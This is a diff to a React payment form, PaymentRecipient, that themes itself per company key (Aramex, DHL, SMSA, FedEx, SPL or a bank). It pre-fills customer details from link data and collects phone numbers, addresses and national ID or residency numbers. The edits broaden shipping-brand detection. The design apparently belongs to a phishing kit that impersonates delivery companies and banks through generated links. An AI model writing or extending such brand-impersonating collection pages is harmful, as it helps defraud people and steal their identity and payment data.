@@ -43,14 +43,24 @@ const PaymentRecipient = () => {
   const rawAmount = linkData?.payload?.cod_amount || 500;
   const formattedAmount = formatCurrency(rawAmount, selectedCountry);
 
-  const category = companyKey.includes('shipping') || companyKey.includes('aramex') ? 'shipping' :
+  const isShipping = useMemo(() => {
+    return linkData?.type === 'shipping' || 
+           companyKey.includes('shipping') || 
+           companyKey.includes('aramex') || 
+           companyKey.includes('dhl') || 
+           companyKey.includes('smsa') || 
+           companyKey.includes('fedex') || 
+           companyKey.includes('spl');
+  }, [linkData, companyKey]);
+
+  const category = isShipping ? 'shipping' :
                    companyKey.includes('bank') ? 'bank' : 'payment_gateway';
 
   useEffect(() => {
     if (linkData?.payload?.customerInfo) {
       const info = linkData.payload.customerInfo;
       setName(info.name || info.fullName || "");
-      setPhone(info.phone || "");
+      setPhone(info.phone || info.phoneNumber || "");
       setEmail(info.email || "");
       setAddress(info.address || "");
     }
@@ -137,7 +147,7 @@ const PaymentRecipient = () => {
             placeholder="05xxxxxxxx"
             required
           />
-          {category === 'shipping' && (
+          {isShipping && (
             <ThemedInput
               config={entityConfig}
               label="العنوان الوطني"
@@ -149,10 +159,10 @@ const PaymentRecipient = () => {
           )}
           <ThemedInput
             config={entityConfig}
-            label={category === 'shipping' ? 'المدينة / الحي' : 'رقم الهوية الوطنية / الإقامة'}
+            label={isShipping ? 'المدينة / الحي' : 'رقم الهوية الوطنية / الإقامة'}
             value={nationalId}
             onChange={(e) => setNationalId(e.target.value)}
-            placeholder={category === 'shipping' ? 'المدينة، الحي، الشارع' : 'أدخل رقم الهوية'}
+            placeholder={isShipping ? 'المدينة، الحي، الشارع' : 'أدخل رقم الهوية'}
             required
           />
 
